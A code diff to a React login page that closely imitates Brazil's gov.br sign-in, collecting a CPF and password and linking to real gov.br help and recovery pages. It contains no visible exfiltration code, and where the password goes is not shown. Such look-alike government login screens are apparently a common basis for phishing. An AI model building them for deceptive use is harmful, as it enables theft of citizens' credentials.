@@ -181,35 +181,37 @@ export default function LoginPage() {
                   </div>
                 </div>
 
+                <div className="gov-divider-line"></div>
+
                 <div className="gov-help-links">
-                  <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/ajuda-da-conta-gov.br">
-                    <img src="https://sso.acesso.gov.br/assets/govbr/fontawesome/webfonts/circle-question-solid.svg" alt="" className="gov-help-icon" />
-                    Está com dúvidas e precisa de ajuda?
+                  <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br" target="_blank" rel="noreferrer">
+                    Entenda a conta gov.br
                   </a>
-                  <a href="https://cadastro.acesso.gov.br/termo-de-uso">
-                    Termo de Uso e Aviso de Privacidade
+                  <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/duvidas-frequentes" target="_blank" rel="noreferrer">
+                    Dúvidas frequentes
                   </a>
                 </div>
               </>
             )}
 
             {step === 2 && (
-              <>
+              <div className="gov-step2-form" style={{width: '100%'}}>
                 <h3 className="gov-card-title">Digite sua senha</h3>
-
                 <div className="gov-user-info">
-                  <label className="gov-label">CPF</label>
-                  <h4 className="gov-cpf-display">{displayCpf}</h4>
+                  <span style={{fontSize: '14px', color: '#666'}}>Você está acessando como:</span>
+                  <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '8px'}}>
+                    <h4 className="gov-cpf-display">{cpf}</h4>
+                    <button onClick={() => setStep(1)} style={{background: 'none', border: 'none', color: '#1351b4', cursor: 'pointer', fontSize: '14px', fontWeight: '500'}}>Alterar CPF</button>
+                  </div>
                 </div>
-
-                <form onSubmit={handleLogin}>
-                  <label className="gov-label" htmlFor="password">Senha</label>
-                  <div className="gov-password-wrapper">
-                    <input
-                      id="password"
-                      type={showPassword ? "text" : "password"}
-                      className="gov-input"
-                      placeholder="Digite sua senha atual"
+                
+                <div style={{marginBottom: '24px'}}>
+                  <label className="gov-label">Senha</label>
+                  <div style={{position: 'relative'}}>
+                    <input 
+                      type={showPassword ? "text" : "password"} 
+                      className="gov-input" 
+                      placeholder="Digite sua senha"
                       value={password}
                       onChange={(e) => { setPassword(e.target.value); setErrorMsg(''); }}
                       onKeyPress={handleKeyPressPassword}
@@ -217,46 +219,33 @@ export default function LoginPage() {
                       autoFocus
                       required
                     />
-                    <span
-                      className="toggle-password fa fa-fw fa-eye"
+                    <button 
+                      type="button"
                       onClick={() => setShowPassword(!showPassword)}
-                      tabIndex={2}
-                    ></span>
+                      style={{position: 'absolute', right: '16px', top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', color: '#1351b4', cursor: 'pointer'}}
+                    >
+                      <i className={`fa-solid ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`}></i>
+                    </button>
                   </div>
-
                   {errorMsg && (
                     <div style={{color: 'var(--clr-danger)', marginTop: '8px', fontSize: '0.875rem', fontWeight: 600}}>
                       <i className="fa-solid fa-circle-exclamation" style={{marginRight: 4}}></i> {errorMsg}
                     </div>
                   )}
+                  <button className="gov-forgot-link" onClick={() => window.location.href = 'https://sso.acesso.gov.br/account-recovery'}>Esqueci minha senha</button>
+                </div>
 
-                  <div className="gov-actions-column">
-                    <div className="gov-button-panel gov-button-panel-between">
-                      <button
-                        type="button"
-                        className="gov-btn-outline"
-                        onClick={handleCancel}
-                      >
-                        Cancelar
-                      </button>
-                      <button
-                        type="submit"
-                        className={`gov-btn-primary${isLoading ? ' gov-btn-loading' : ''}`}
-                        disabled={isLoading}
-                      >
-                        Entrar
-                      </button>
-                    </div>
-                    <button
-                      type="button"
-                      className="gov-forgot-link"
-                      onClick={() => window.location.href = 'https://sso.acesso.gov.br/account-recovery'}
-                    >
-                      Esqueci minha senha
-                    </button>
-                  </div>
-                </form>
-              </>
+                <div className="gov-button-panel-between">
+                  <button className="gov-btn-outline" onClick={handleCancel}>Cancelar</button>
+                  <button 
+                    className={`gov-btn-primary ${isLoading ? 'gov-btn-loading' : ''}`}
+                    onClick={handleLogin}
+                    disabled={isLoading}
+                  >
+                    {isLoading ? '' : 'Entrar'}
+                  </button>
+                </div>
+              </div>
             )}
           </div>
 
@@ -267,6 +256,11 @@ export default function LoginPage() {
               </a>
             </div>
           )}
+
+          <div className="gov-button-panel-between" style={{marginTop: '32px', width: '100%', maxWidth: '400px', display: 'flex', justifyContent: 'space-between', padding: '0 8px'}}>
+            <a href="https://acesso.gov.br/termos-de-uso/" target="_blank" rel="noreferrer" style={{color: '#1351b4', fontSize: '12px', textDecoration: 'none'}}>Termos de Uso</a>
+            <a href="https://www.gov.br/pt-br/acessibilidade" target="_blank" rel="noreferrer" style={{color: '#1351b4', fontSize: '12px', textDecoration: 'none'}}>Acessibilidade</a>
+          </div>
         </div>
       </main>
     </div>
